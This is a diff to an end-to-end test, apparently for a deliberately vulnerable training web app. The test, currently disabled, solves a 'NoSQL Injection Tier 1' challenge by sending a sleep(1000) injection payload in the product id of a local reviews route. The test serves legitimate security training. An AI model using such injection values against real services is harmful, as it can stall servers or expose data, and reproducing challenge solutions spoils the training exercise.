@@ -13,11 +13,21 @@ describe('/rest/product/reviews', () => {
 
     xit('should be possible to inject a command into the get route', () => { // FIXME Fails after merging gsoc-frontend and -challenges
       browser.waitForAngularEnabled(false)
-      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); } }; xhttp.open("GET","http://localhost:3000/rest/product/sleep(1000)/reviews", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.send();')
+      browser.executeScript(() => {
+        var xhttp = new XMLHttpRequest()
+        xhttp.onreadystatechange = function () {
+          if (this.status === 200) {
+            console.log('Success')
+          }
+        }
+        xhttp.open('GET', 'http://localhost:3000/rest/product/sleep(1000)/reviews', true)
+        xhttp.setRequestHeader('Content-type', 'text/plain')
+        xhttp.send()
+      })
       browser.driver.sleep(5000)
       browser.waitForAngularEnabled(true)
     })
-    // protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 1' })
+    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 1' })
   })
 
   describe('challenge "NoSql Reviews Injection"', () => {
